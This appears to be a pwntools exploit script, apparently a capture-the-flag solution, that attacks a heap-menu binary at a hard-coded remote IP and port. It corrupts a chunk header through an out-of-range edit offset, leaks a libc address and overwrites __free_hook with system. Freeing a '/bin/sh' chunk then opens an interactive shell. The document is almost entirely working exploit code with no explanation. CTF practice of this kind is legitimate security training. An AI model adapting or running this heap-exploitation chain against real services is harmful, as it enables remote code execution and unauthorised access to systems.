from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']


def add(size,content):
    p.sendlineafter("> ",str(1))
    p.sendlineafter("> ",str(size))
    p.sendafter("> ",content)
def edit(id,offset,content):
    p.sendlineafter("> ",str(2))
    p.sendlineafter("> ",str(id))
    p.sendlineafter("> ",str(offset))
    p.sendafter("> ",content)
def delete(id):
    p.sendlineafter("> ",str(3))
    p.sendlineafter("> ",str(id))
def show(id):
    p.sendlineafter("> ",str(4))
    p.sendlineafter("> ",str(id))


p = process("./chall")
p = remote("47.104.169.149",14269)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

add(0xf8,'\n')#0
add(0x220,'\n')#1
add(0x100,'\n')#2
add(0x18,'/bin/sh\x00\n')

payload = 'a'*48
payload += p64(0x200)+p64(0x441) + '\n'
edit(0,0x80000000,payload)

delete(0)
add(0xf8,'\n')#0
show(1)
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
print hex(leak_addr)
libc_base = leak_addr-(0x7ffff7dcdca0-0x7ffff79e2000)
print hex(libc_base)
free_hook = libc_base+libc.symbols['__free_hook']
print "free_hook:",hex(free_hook)
system_addr = libc_base + libc.sym['system']
print system_addr

add(0x220,'\n')#1
delete(1)
edit(5,0,p64(free_hook)+'\n')
add(0x220,'\n')#1
add(0x220,'ls;\x00\n')#1

edit(7,0,p64(system_addr)+'\n')

# gdb.attach(p,"*$rebase(0xd1A)")
# raw_input()


delete(3)

'''
for i in range(10):
    add(0xf8,'\n')
for i in range(3,10):
    delete(i)
delete(0)

edit(2,0x80000000,payload)
delete(2)

for i in range(5):
    add(0xf8,'\n')
'''



# edit(1,0x80000000,'a'*0x200+'\n')


# edit(0,0x80000000,'a'*0x18+'\n')










p.interactive()